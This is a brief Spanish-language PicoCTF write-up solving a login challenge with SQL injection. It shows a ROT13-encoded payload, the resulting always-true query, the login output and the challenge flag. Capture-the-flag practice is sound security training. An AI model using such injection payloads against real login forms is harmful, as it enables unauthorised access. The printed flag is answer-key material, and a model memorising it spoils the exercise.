# Retos PicoCTF


## Objetivo 
There is a secure website running at https://jupiter.challenges.picoctf.org/problem/54253/ (link) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

## Solución 

```
cuando ingresas la password se encripta a rot13 por lo cual se envia encriptado para que lo desencripte.
password: ' be 1==1;
SQL query: SELECT * FROM admin where password = '' or 1==1;'
Logged in!
Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}
```

## Notas adicionales 

## Referencias 
